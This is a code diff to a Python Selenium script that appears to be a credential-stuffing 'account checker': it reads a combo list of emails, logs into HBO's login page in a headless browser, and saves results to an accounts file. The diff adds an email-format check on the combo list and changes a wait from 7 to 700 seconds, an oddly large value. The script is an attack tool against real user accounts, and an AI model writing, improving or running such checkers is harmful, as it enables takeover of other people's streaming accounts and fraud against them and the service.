@@ -31,6 +31,10 @@ def hbo():
 	browser_options.add_argument('--headless=new')
 	index =0
 	while index != len(users):
+		if '@' not in users[index]:
+				print('Invalid email format in combo-list.\nPlease check your combos and try again.')
+				print('Ending')
+				exit()
 		os.makedirs(plain_directory + '/accounts', exist_ok=True)
 		with open(plain_directory + '/accounts/hbo_acc', 'a') as account_results:
 			try:
@@ -39,7 +43,7 @@ def hbo():
 				browser.set_window_size(500, 700)
 				browser.get(page)
 				shadows = Shadow(browser)
-				time.sleep(7)
+				time.sleep(700)
 				email_box = shadows.find_element('input[id="login-username-input"]')
 				password_box = shadows.find_element('input[id="login-password-input"]')
 				sign_in_button = shadows.find_element('button[type="submit"]')
